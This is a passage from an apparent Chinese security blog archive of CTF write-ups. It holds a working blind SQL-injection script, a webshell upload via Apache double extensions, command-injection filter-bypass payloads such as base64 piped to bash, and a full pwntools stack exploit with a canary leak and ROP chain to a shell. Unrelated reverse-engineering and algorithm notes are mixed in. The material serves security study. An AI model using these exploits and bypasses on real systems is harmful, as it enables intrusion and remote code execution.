得到如下数据：12345678910111213141516171819202122232425262728/var/www/html/Web/kind/kindeditor/attached&#123;&quot;moveup_dir_path&quot;:&quot;&quot;,&quot;current_dir_path&quot;:&quot;&quot;,&quot;current_url&quot;:&quot;\/kindeditor\/php\/..\/attached\/&quot;,&quot;total_count&quot;:2,&quot;file_list&quot;:[ &#123;&quot;is_dir&quot;:false, &quot;has_file&quot;:false, &quot;filesize&quot;:51, &quot;dir_path&quot;:&quot;&quot;, &quot;is_photo&quot;:false, &quot;filetype&quot;:&quot;php&quot;, &quot;filename&quot;:&quot;flag_clue.php&quot;, &quot;datetime&quot;:&quot;2015-11-16 21:58:28&quot; &#125;, &#123;&quot;is_dir&quot;:false, &quot;has_file&quot;:false, &quot;filesize&quot;:28, &quot;dir_path&quot;:&quot;&quot;, &quot;is_photo&quot;:false, &quot;filetype&quot;:&quot;html&quot;, &quot;filename&quot;:&quot;index.html&quot;, &quot;datetime&quot;:&quot;2015-11-16 21:37:12&quot; &#125; ]&#125; 里面有个 flag_clue.php 。访问:1http://218.76.35.75:65180/kindeditor/attached/flag_clue.php 得到：1=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ 脚本:123import base64key = &quot;=0nYvpEdhVmcnFUZu9GRlZXd7pzZhxmZ&quot;print(base64.b64decode(key[::-1])) 得到flag：1b&apos;flag:&#123;uveDoneAgreatJob&#125;&apos; DrinkCoffee123描述：据说登录可以领到咖啡票，不过不知道密码哦……http://218.76.35.75:65280/ 访问了之后如下： 需要我们输入一个密码，还有就是ip限制的要求，和来源的要求。 ip可以通过 X-Forwarded-For 伪造。来源 可以通过 Refferer 伪造。 抓包后可以看到头部有密码字段： 另外题目在form上加了一层图片，可以用firebug直接把图片去掉，然后就能submit密码了。 得到flag：184294deb396ba4373c5ea8b73fa111b2]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup%2F</url>
      <content type="text"><![CDATA[mysql 盲注 命令执行 ${IFS}绕过 题目1http://218.76.35.74:20130/index.php SQL注入经过fuzz，一些关键字被过滤了：123456orforunion空格逗号，* 一些关键字没有过滤：1234567selectfromwheresubstrascii^. 无回显，考察盲注。用异或^进行注入。 给出利用脚本：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# -*- coding:utf-8 -*-import requestsimport stringimport sysglobal findBitdef sendPayload(payload): proxy = &#123;"http":"http://127.0.0.1:8080"&#125; url = "http://218.76.35.74:20130/login.php" headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125; parm = "uname="+payload+"&amp;passwd=admin" content = requests.post(url,data=parm,headers=headers,proxies=proxy) return content.textusernameerr = "username error!!"def generateTarget(flag): if flag == "database": return "database()" elif flag == "passwd": return "(SELECT(passwd)from(admin))"def doubleSearch(leftNum,rightNum,i,target): global findBit midNum = (leftNum + rightNum) / 2 if (rightNum != leftNum +1): payload = "admin'^(select(ascii(mid(("+generateTarget(target) +")from("+ str(i) +"))))&lt;="+str(midNum) +")='0" recv = sendPayload(payload) if usernameerr in recv: doubleSearch(midNum,rightNum,i,target) else: doubleSearch(leftNum,midNum,i,target) else: if rightNum != 0: sys.stdout.write(chr(rightNum)) sys.stdout.flush() else: findBit = 1 returndef exp(): global findBit i = 1 findBit = 0 print "The passwd:" target = "passwd" while i : doubleSearch(-1,255,i,target) i += 1 if findBit == 1: sys.stdout.write("\r\n") breakexp() 获得密码的Md5值为：50f87a3a3ad48e26a5d9058418fb78b5解密后为： shuangshuang 命令执行登陆后有一个命令执行的地方，但是过滤了空格，而且仅仅回显出结果的最后一条。参考：浅谈CTF中命令执行与绕过的小技巧，空格可以利用${IFS}替代。而回显可以利用head来选择。 输入1ls$&#123;IFS&#125;/var/www/html|head$&#123;IFS&#125;-n$&#123;IFS&#125;1 得到：19ef89ad913e848b64b73e3aa721e44e4 输入1ls$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/ 得到：1this_pag0_is_F1a9.php 输入：1cat$&#123;IFS&#125;/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/* 得到：1flag&#123;sQ1_1NJEct_coMMond_eXEC&#125; 或者直接访问:1http://218.76.35.74:20130/9ef89ad913e848b64b73e3aa721e44e4/this_pag0_is_F1a9.php]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XNUCA 2017-Web专题赛前指导-Document-writeup]]></title>
      <url>%2F2017%2F08%2F16%2FXNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup%2F</url>
      <content type="text"><![CDATA[php伪协议 文件读取 文件上传绕过 apache解析漏洞 题目1http://218.76.35.74:20129 Solution查看源代码：12345678910&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- include.php --&gt;&lt;/body&gt;&lt;/html&gt; 发现有include.php，访问：1http://218.76.35.74:20129/include.php 提示 the parameter is file! :) 。同时查看源代码有upload.php，是个上传页面。 利用php伪协议读取源码。1http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=include include.php:123456789101112131415161718&lt;html&gt;Tips: the parameter is file! :)&lt;!-- upload.php --&gt;&lt;/html&gt;&lt;?php @$file = $_GET["file"]; if(isset($file)) &#123; if (preg_match('/http|data|ftp|input|%00/i', $file) || strstr($file,"..") !== FALSE || strlen($file)&gt;=70) &#123; echo "&lt;p&gt; error! &lt;/p&gt;"; &#125; else &#123; include($file.'.php'); &#125; &#125;?&gt; 读取upload源码：1http://218.76.35.74:20129/include.php?file=php://filter/read=convert.base64-encode/resource=upload upload.php:12345678910111213141516171819202122232425&lt;form action="" enctype="multipart/form-data" method="post"name="upload"&gt;file:&lt;input type="file" name="file" /&gt;&lt;br&gt;&lt;input type="submit" value="upload" /&gt;&lt;/form&gt;&lt;?phpif(!empty($_FILES["file"]))&#123; echo $_FILES["file"]; $allowedExts = array("gif", "jpeg", "jpg", "png"); @$temp = explode(".", $_FILES["file"]["name"]); $extension = end($temp); if (((@$_FILES["file"]["type"] == "image/gif") || (@$_FILES["file"]["type"] == "image/jpeg") || (@$_FILES["file"]["type"] == "image/jpg") || (@$_FILES["file"]["type"] == "image/pjpeg") || (@$_FILES["file"]["type"] == "image/x-png") || (@$_FILES["file"]["type"] == "image/png")) &amp;&amp; (@$_FILES["file"]["size"] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts)) &#123; move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]); echo "file upload successful!Save in: " . "upload/" . $_FILES["file"]["name"]; &#125; else &#123; echo "upload failed!"; &#125;&#125;?&gt; 随手上传了一个 god4.php.jpg 访问:1http://218.76.35.74:20129/upload/god4.php.jpg 被解析了，应该是因为apache的缘故，不识别jpg，然后向前递归解析了php。既然能解析，那就用菜刀连上去： 在虚拟终端中：1find / | grep flag 然后发现有：1/etc/.sshkey/flag.txt 得到flag:12[/var/www/html/upload/]$ cat /etc/.sshkey/flag.txt7F5A58DFC54CFAC9903FE85D92703787 这题也有多种解法，因为在include.php中可以发现，没有对zip或者phar协议等进行过滤，可以利用这些协议进行直接的文件包含。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[命令执行的一些绕过技巧]]></title>
      <url>%2F2017%2F08%2F15%2F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%2F</url>
      <content type="text"><![CDATA[命令执行的一些绕过技巧已收录至: WAF-Bypass 多条命令法一： 逻辑运算符绕过escapeshellcmd法一：win下执行bat1234567&lt;?php$command = 'dir '.$_POST['dir'];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents('out.bat',$escaped_command);system('out.bat');?&gt; 执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。payload:1dir=../ %1a whoami 法二：宽字节注入php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。1escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;); 之后该语句会变成1echo 繺;id 从而实现 id 命令的注入。 空格过滤法一： ${IFS}payload1:1234ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flagnice day payload2:12ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flagnice day payload3:12ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day 法二： 重定向符&lt;&gt;payload1：12ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flagnice day payload2：12ubuntu@VM-207-93-ubuntu:~$ cat&lt;flagnice day 黑名单绕过法一： 拼接12ubuntu@VM-207-93-ubuntu:~$ a=c;b=at;c=flag;$a$b $cnice day 法二： 利用已存在的资源从已有的文件或者环境变量中获得相应的字符。 法三： base64编码payload1:12ubuntu@VM-207-93-ubuntu:~$ `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`nice day payload2:12ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashnice day 法四： 单引号、双引号payload1:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flagnice day payload2:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;agnice day payload3:12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&apos;&apos;agnice day 法五：反斜线 \payload:12ubuntu@VM-207-93-ubuntu:~$ c\at fl\agnice day 无回显长度限制12345&lt;?phpif(strlen($_GET[test])&lt;8)&#123;echo shell_exec($_GET[test]);&#125;?&gt; 文件构造payload1:1a&gt;wget payload2:11&gt;wget payload3:1&gt;wget 将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。. LINUX下一些已有字符 ${PS2} 对应字符 ‘&gt;’ ${PS4} 对应字符 ‘+’ ${IFS} 对应 内部字段分隔符 ${9} 对应 空字符串 工具 shelling Refference PHP绕过open_basedir列目录的研究 eval长度限制绕过 &amp;&amp; PHP5.6新特性 关于lnmp目录禁止执行的绕过与正确方法 一些不包含数字和字母的webshell php webshell分析和绕过waf技巧 【技术分享】命令执行和绕过的一些小技巧 浅谈CTF中命令执行与绕过的小技巧 Mathias:命令执行的bypass技巧]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[逆向学习笔记（一）]]></title>
      <url>%2F2017%2F08%2F14%2F%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
      <content type="text"><![CDATA[跟着《加密与解密》学习。 第一章：基础知识文本字符 字节存储顺序与CPU有关。 Big-Endian: 高位字节存入低地址，低位字节存入高地址，依次排列。 Little-Endian： 低位字节存入高地址，高位字节存入高地址，反序排列。 ASCII 与 Unicode字符集 ASCII: 127以上的部分不统一。8位。 Unicode： ASCII字符编码的扩展。在win中用两个字节进行编码，亦称宽字节编码(Widechars)。使用0~65535之间的双字节无符号整数对每个字节编码。所有字符均为16位。 Windows操作系统WinAPI简介 略 常用Win32API函数 API函数区分字符集： A表示ANSI，W表示Widechars即Unicode。 常用的API函数： hmemcpy() : win16 API函数。将内存某块数据拷贝到另一个地方。 GetWindowText（）：USER32.DLL中。取得一个窗体的标题文字或一个文本控件的内容。 GetWindowTextA GetWindowTextW GetDlgItem（）： 获取指定对话框的句柄。 GetDlgItemText（）: 获取对话框文本。 GetDlgItemTextA GetDlgItemTextW GetDlgItemInt（） ： 获取对话框整数值。 MessageBox（）：USER32.DLL中，创建和显示信息框。 MessageBoxA MessageBoxW 句柄：Windows标识，由应用程序简历或使用的对象所使用的一个唯一的整数值。 Windows消息机制 消息(Message)驱动式系统。 消息队列：系统消息队列，应用程序消息队列。 常用的Windows消息函数： SendMessage（）函数 WM_COMMAND消息 WM_DESTORY WM_GETTEXT WM_QUIT 保护模式简介 三种模式： 实模式，保护模式，虚拟86模式。当前系统主要运行在保护模式下。 虚拟内存 保护模式的权限级别 认识PE格式 文件分成不同的区块： .text : 代码段 .rdata : 运行期只读数据 .data : 初始化的数据块 .idata : 包含其他外来DLL的函数及数据信息，即输入表。 .rsrc : 包含模块的全部资源 PE相关名词解释： 入口点(Entry Point) ： 程序执行时的第一行代码 文件偏移地址(File Offset) : PE文件在磁盘上时各数据的地址。文件偏移地址从PE文件的第一个字节开始计数，起始值为0 虚拟地址（Virtual Address， VA）: 程序访问存储器所使用的逻辑地址。又称内存偏移地址(Memory Offset)。可写成“段选择子：偏移量”的形式。 基地址（ImageBase）：文件执行时被映射到指定内存地址中，这个初始内存地址即为基地址。由PE文件本身设定。 第二章 动态分析技术OllDbg 界面 反汇编面板窗口 信息面板窗口 数据面板窗口 寄存器面板窗口 堆栈面板窗口 配置 界面设置 调试设置 加载符号文件 加载右键菜单 加载程序 创建进程 attach进程 基本操作 F7 ： 单步步进，遇到CALL 跟进 F8 ： 单步步入，遇到CALL 路过，不跟进 Ctrl+ F9 : 直到ret指令时中断 Alt + F9 : 从系统领空回到应用程序领空 F9 ： 运行程序 F2 ： 设置断点 保存修改后的文件： 右键 Copy to executable/Selection Alt+M ： 显示内存 断点INT3断点int3断点，机器码为CCh。当被调试进程执行INT3指令导致一个异常时，调试器捕捉异常并停下来。好处是可以下无数个，但缺点是改变了源程序指令，容易被检测到。检测方法为：取得检测函数的地址，读取第一个字节是否为cc。 硬件断点与DRx调试器相关。DRx调试器一共有八个。 DR0 ~ DR3 : 调试地址寄存器，保存需要监视的地址。 DR4 ~ DR5 : 未知 DR6 : 调试寄存器组状态寄存器 DR7 : 调试寄存器组控制寄存器 DR0 ~ DR3来设定地址，DR7设置状态，最多只能设置4个断电。优点速度快，可用于替代CC断点。 内存断点对所设的地址设置为不可访问/不可写属性。当访问/写入时产生异常，ollydbg捕获异常后比较是不是断点地址，若是则中断。缺点：慢。不修改源代码，在遇到代码校验时，并且硬件断点失灵的时候，可以用内存断点来代替。数量为1个。 内存访问一次性断点按Alt+M显示内存后，有许多段。在相应的段上单击右键，选择Set break on access，会对整个内存块设置该类断点。这是一次性断点，当所在段被读取或被执行后中断，中断完成后断点将被删除。 消息断点条件断点条件记录断点第三章 静态分析技术文件类型分析 PEID工具 用处：检测大多数编译语言、病毒和加密的壳 原理：被加壳的程序处理过的程序在壳里会留下相关加壳软件的信息。 参考 Fileinfo]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[WAF-Bypass] Mysql 注入绕过姿势]]></title>
      <url>%2F2017%2F08%2F14%2FWAF-Bypass-Mysql-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[Codegate 2017 Qual-babypwn-writeup]]></title>
      <url>%2F2017%2F08%2F12%2FCodegate-2017-Qual-babypwn-writeup%2F</url>
      <content type="text"><![CDATA[Codegate 2017 Qual-babypwn-writeup 分析基本功能题目提供了一个32位的程序。参数传递用栈来进行。用gdb载入后看一下保护措施，如下：12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE 用IDA打开进行分析。文件实现了一个socket服务。其真正的服务函数如下：123456789101112131415161718192021222324252627282930313233343536373839int sub_8048A71()&#123; int v1; // [sp+1Ch] [bp-3Ch]@2 char v2; // [sp+24h] [bp-34h]@1 int v3; // [sp+4Ch] [bp-Ch]@1 v3 = *MK_FP(__GS__, 20); memset(&amp;v2, 0, 0x28u); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; sub_80488B1("\n===============================\n"); sub_80488B1("1. Echo\n"); sub_80488B1("2. Reverse Echo\n"); sub_80488B1("3. Exit\n"); sub_80488B1("===============================\n"); v1 = sub_804895A(); if ( v1 != 1 ) break; sub_80488B1("Input Your Message : "); sub_8048907(&amp;v2, 0x64u); sub_80488B1(&amp;v2); &#125; if ( v1 != 2 ) break; sub_80488B1("Input Your Message : "); sub_8048907(&amp;v2, 0x64u); sub_80489C8(&amp;v2); sub_80488B1(&amp;v2); &#125; if ( v1 == 3 ) break; sub_80488B1("\n[!] Wrong Input\n"); &#125; return *MK_FP(__GS__, 20) ^ v3;&#125; 整体上看，实现了三个功能，第一个是读入（sub_8048907）输入的数据并输出来（sub_8048907）。第二个功能是Reverse Echo，好像没啥用。第三个功能是退出。 在Echo功能的sub_8048907(&amp;v2, 0x64u);中：1234567891011ssize_t __cdecl sub_8048907(void *a1, size_t a2)&#123; int v2; // ST2C_4@1 ssize_t result; // eax@1 int v4; // ecx@1 v2 = *MK_FP(__GS__, 20); result = recv(fd, a1, a2, 0); v4 = *MK_FP(__GS__, 20) ^ v2; return result;&#125; 将读入的字符通过recv()函数拷贝到数组v2中，读入的字符长度可以达到0x64即100个字节。而数组v2所在的位置为 bp-34h ，0x34 = 52。所以很明显这里存在栈溢出。但因为开了Canary保护，因此如果要利用栈溢出，就需要泄露Canary值或者其他技术。 接下去看输出函数sub_80488B1(&amp;v2);中：12345678910111213ssize_t __cdecl sub_80488B1(const char *a1)&#123; int v1; // ST2C_4@1 size_t v2; // eax@1 ssize_t result; // eax@1 int v4; // ecx@1 v1 = *MK_FP(__GS__, 20); v2 = strlen(a1); result = send(fd, a1, v2, 0); v4 = *MK_FP(__GS__, 20) ^ v1; return result;&#125; 将数组v2的内容发送出去，发送数据的长度由strlen()指定。 泄露canary接下来我们考虑如何泄露Canary值。Canary值的第一个字节总是\x00，加上是小端序。数组v2在一开始通过memset(&amp;v2, 0, 0x28u);进行初始化。所以结合两者情况，栈的分布约莫下；1&apos;\x00&apos; * 0x28 + ? + ? + ? + `\x00` 当我们输入的字符个数少于0x28时，比如aaa，则v2中的第四个字符是\x00，则strlen(v2)就为3。如下：1&apos;a&apos; * 3 + &apos;\x00&apos; * 0x25 + ? + ? + ? + `\x00` 最后返回输出为字符串“aaa”。 但若我们输入的字符个数等于0x28时，由于后面的数据是canary值。此时：12&apos;a&apos; * 0x28 + ? + ? + ? + `\x00`` 对于数组v2而言，canary的第一个字节\x00成了它的结束标志。在strlen时会把canary值得长度加上，在最后返回输出时将canary的值打印出来。从而完成对canary的泄露。 泄露出canary后就该考虑如何进行栈溢出利用。程序中提供了system函数。但若要getshell，我们还需要/bin/sh字符串，及其他一些操作。 泄露libc为得到/bin/sh字符串的地址，我们可以去泄露出libc版本。考虑到有send(fd, a1, v2, 0)函数，我们只要让fd为4（默认值），a1为libc库函数的got地址，设置v2为4，第四个为0，就能够将libc库函数的地址打印出来。通过泄露几个libc库函数的地址就能得到libc版本，并利用偏移计算出/bin/sh字符串的地址。 假如我要泄露setsockopt函数的地址。可以构造payload如下：12345678910payload = &apos;A&apos; * 0x28 payload += p32(canary_value)payload += &apos;A&apos; * 8 # reach 0x28 + 4 + 8 = 52payload += &apos;A&apos; * 4 # reach retpayload += p32(send_sym_addr)payload += p32(vuln_func_addr)payload += p32(4)payload += p32(setsockopt_got_addr)payload += p32(4)payload += p32(0) 其中注意第二行使用了前面得到的canary值。然后我们加上了12个a，这样才能将返回地址覆盖为send_sym_addr的地址。根据32位程序的栈布局，接下来是send()函数调用完后的返回地址，为进一步利用，这里选择回到有漏洞的服务(8048A71)处。再接下来依次是send函数的四个参数。 在发送完payload后，我们还需要在程序选项中输入一次3，选择功能3. Exit\n,这样程序才能执行到ret，即被我们覆写了的返回地址。所以需要发送第二段payload：123r.recvuntil(&quot;Select menu &gt; &quot;)payload = &apos;3&apos;r.sendline(payload) getshell在成功获得libc版本后，现在已经有了system函数，和/bin/sh字符串，但还不能获得shell。因为程序本身是一个socket服务器，所以它的默认文件描述符不是标准输入输出流0或1，而是4，这也是前面调用send函数时第一个参数为4的原因。我们可以使用dup2函数来复制文件描述符，重定向输入输出流。 dup2函数的原型如下：1int dup2(int oldfd,int newfd); 所以对应的，在getshell之前，我们要把原本的文件描述符重定向到标准输入输出流。对应payload为：123456789101112payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(0)payload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(1) exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *r = remote('127.0.0.1','8181')libc = ELF("./libc.so.6")elf = ELF("./babypwn")sh_loclibc_addr = next(libc.search("sh\x00"))setsockopt_loclibc_addr = libc.symbols['setsockopt']dup2_loclibc_addr = libc.symbols['dup2']pop_ret_addr = 0x08048b85pop_pop_ret_addr = 0x08048b84vuln_func_addr = 0x8048A71system_sym_addr = elf.symbols["system"]send_sym_addr = elf.symbols['send']setsockopt_got_addr = elf.got['setsockopt']offset_sh_setsockopt = sh_loclibc_addr - setsockopt_loclibc_addroffset_dup2_setsockopt = dup2_loclibc_addr - setsockopt_loclibc_addrlog.success("system symbols address is : " + hex(system_sym_addr))log.success("send address is : " + hex(send_sym_addr))log.info("First Stage : Leak canary value.\n")r.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'b' * 0x28r.sendline(payload)canary_value = u32('\x00' + r.recv()[0x29:0x2c])log.info("Canary : %s " % hex(canary_value))r.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(send_sym_addr)payload += p32(vuln_func_addr)payload += p32(4)payload += p32(setsockopt_got_addr)payload += p32(4)payload += p32(0)r.sendline(payload)r.recvuntil("Select menu &gt; ")payload = '3'r.sendline(payload)setsockopt_libc_addr = u32(r.recv(4))log.success("setsockopt libc addr is : " + hex(setsockopt_libc_addr))sh_libc_addr = offset_sh_setsockopt + setsockopt_libc_addrdup2_libc_addr = offset_dup2_setsockopt + setsockopt_libc_addrr.recvuntil("Select menu &gt; ")payload = "1"r.sendline(payload)r.recvuntil("Input Your Message : ")payload = 'A' * 0x28 payload += p32(canary_value)payload += 'A' * 8 # reach 0x28 + 4 + 8 = 52payload += 'A' * 4 # reach retpayload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(0)payload += p32(dup2_libc_addr)payload += p32(pop_pop_ret_addr)payload += p32(4)payload += p32(1)payload += p32(system_sym_addr)payload += p32(0)payload += p32(sh_libc_addr)r.sendline(payload)r.recvuntil("Select menu &gt; ")payload = '3'r.sendline(payload)r.recv()r.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[hihoCoder 162周：回文字符串]]></title>
      <url>%2F2017%2F08%2F12%2FhihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2%2F</url>
      <content type="text"><![CDATA[回文字符串。动态规划。 题目描述给定一个字符串 S ，最少需要几次增删改操作可以把 S 变成一个回文字符串？一次操作可以在任意位置插入一个字符，或者删除任意一个字符，或者把任意一个字符修改成任意其他字符。 输入字符串 S。S 的长度不超过100, 只包含’A’-‘Z’。 输出最少的修改次数。 样例输入ABAD 样例输出1 分析这题采用动态规划。 读入的字符串假设用s表示。则s[i..j]，表示从下标为i的字符到下标为j的字符所组成的字符子串（字符串下标从0开始），而s[i]表示下标为i的字符。例如，字符串“ABCD”，则s[0,2]表示字符串“ABC”，s[1]为字符“B”。 用一个二维数组dp[i][j]来保存状态，其中对于每个dp[i][j]，表示对字符串s[i..j]，使之成为回文字符串所需的最少操作。 现在考察子串s[i..j]。 第一种情况，首尾恰好相同，即 s[i] == s[j]。则对于子串s[i..j]而言，它要变成回文字符串所需的最少操作，与子串s[i-1..j-1]变成回文字符串所需的最少操作数相同。所以有 dp[i][j] = dp[i-1][j+1] 第二种情况，首尾不同，即 s[i] != s[j]。要想让子串s[i..j]变成回文字符串，我们可以利用题目提供的三种操作：增加，删除，修改。 接下来我们分情况讨论。 假设 s[i..j-1] 是回文字符串。则我们可以在s[i]之前添加上一个字符，使之匹配字符s[j]，从而让 s[i..j] 成为回文字符串。此时，dp[i][j] = dp[i][j-1] + 1。或者，我们直接删除掉字符s[j]，让 s[i..j] 变成s[i..j-1]，从而成为回文字符串，此时同样，dp[i][j] = dp[i][j-1] + 1 假设 s[i+1..j] 是回文字符串。则我们可以在s[j]之后添加一个字符，使之匹配字符s[i]，从而让 s[i..j] 成为回文字符串，此时，dp[i][j] = dp[i+1][j] + 1。或者，我们直接将字符s[i]删掉，让 s[i..j] 变成 s[i+1，j]，从而成为回文字符串，此时也有 dp[i][j] = dp[i+1][j] + 1。 假设 s[i-1..j-1] 是回文字符串。则我们可以修改s[i]，使之匹配s[j]，或者修改s[j]，使之匹配s[i]。这种情况下，有：d[i][j] = dp[i-1][j-1] + 1 以上三种情况，囊括了对字符串s[i..j]所能操作的所有情况。而为求最小操作数，只要取三种情况的最小值。 代码123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#define MAX_N 1005using namespace std;char str[MAX_N];int dp[MAX_N][MAX_N];int min_dp(int a,int b,int c)&#123; int temp = a&gt;b?b:a; return temp&gt;c?c:temp;&#125;int main()&#123; scanf("%s",str); int len = strlen(str); memset(dp, 0, sizeof(dp)); for (int i=len-1 ;i&gt;=0 ;i--)&#123; for (int j=i ;j&lt;len ;j++)&#123; if ( str[i] == str[j])&#123; dp[i][j] = dp[i+1][j-1]; &#125;else&#123; dp[i][j] = min_dp(dp[i+1][j],dp[i][j-1],dp[i+1][j-1]) + 1; &#125; &#125; &#125; &#125; printf("%d",dp[0][len-1]); return 0;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROP学习：利用通用gadget]]></title>
      <url>%2F2017%2F08%2F09%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路。 通用Gadget在x64下进行pwn时，由于参数的传递是通过寄存器来传递的，所以需要寻找gadget。有时用一些工具比如ROPgadget，使用下面的命令：1ROPgadget ---binary bin --only &quot;pop|ret&quot; 来寻找gadget。但有时候找不到可用的gadget。 但在x64的环境下，程序有调用libc.so的话，一般会有一个__libc_csu_init()函数。利用里面的gadget可以达到向函数进行传参的功能。这就是通用gadget。 以蒸米师傅的《一步一步学ROP之linux_x64篇》为例研究一下。其源代码level5.c如下：12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, "Hello, World\n", 13); vulnerable_function();&#125; 用objdump查看，习惯intel语法了所以这里加了个 -Mintel1objdump -d -Mintel level5 其中__libc_csu_init函数：12345678910111213141516171819202122232425262728293031323334353600000000004005a0 &lt;__libc_csu_init&gt;: 4005a0: 48 89 6c 24 d8 mov QWORD PTR [rsp-0x28],rbp 4005a5: 4c 89 64 24 e0 mov QWORD PTR [rsp-0x20],r12 4005aa: 48 8d 2d 73 08 20 00 lea rbp,[rip+0x200873] # 600e24 &lt;__init_array_end&gt; 4005b1: 4c 8d 25 6c 08 20 00 lea r12,[rip+0x20086c] # 600e24 &lt;__init_array_end&gt; 4005b8: 4c 89 6c 24 e8 mov QWORD PTR [rsp-0x18],r13 4005bd: 4c 89 74 24 f0 mov QWORD PTR [rsp-0x10],r14 4005c2: 4c 89 7c 24 f8 mov QWORD PTR [rsp-0x8],r15 4005c7: 48 89 5c 24 d0 mov QWORD PTR [rsp-0x30],rbx 4005cc: 48 83 ec 38 sub rsp,0x38 4005d0: 4c 29 e5 sub rbp,r12 4005d3: 41 89 fd mov r13d,edi 4005d6: 49 89 f6 mov r14,rsi 4005d9: 48 c1 fd 03 sar rbp,0x3 4005dd: 49 89 d7 mov r15,rdx 4005e0: e8 1b fe ff ff call 400400 &lt;_init&gt; 4005e5: 48 85 ed test rbp,rbp 4005e8: 74 1c je 400606 &lt;__libc_csu_init+0x66&gt; 4005ea: 31 db xor ebx,ebx 4005ec: 0f 1f 40 00 nop DWORD PTR [rax+0x0] 4005f0: 4c 89 fa mov rdx,r15 4005f3: 4c 89 f6 mov rsi,r14 4005f6: 44 89 ef mov edi,r13d 4005f9: 41 ff 14 dc call QWORD PTR [r12+rbx*8] 4005fd: 48 83 c3 01 add rbx,0x1 400601: 48 39 eb cmp rbx,rbp 400604: 75 ea jne 4005f0 &lt;__libc_csu_init+0x50&gt; 400606: 48 8b 5c 24 08 mov rbx,QWORD PTR [rsp+0x8] 40060b: 48 8b 6c 24 10 mov rbp,QWORD PTR [rsp+0x10] 400610: 4c 8b 64 24 18 mov r12,QWORD PTR [rsp+0x18] 400615: 4c 8b 6c 24 20 mov r13,QWORD PTR [rsp+0x20] 40061a: 4c 8b 74 24 28 mov r14,QWORD PTR [rsp+0x28] 40061f: 4c 8b 7c 24 30 mov r15,QWORD PTR [rsp+0x30] 400624: 48 83 c4 38 add rsp,0x38 400628: 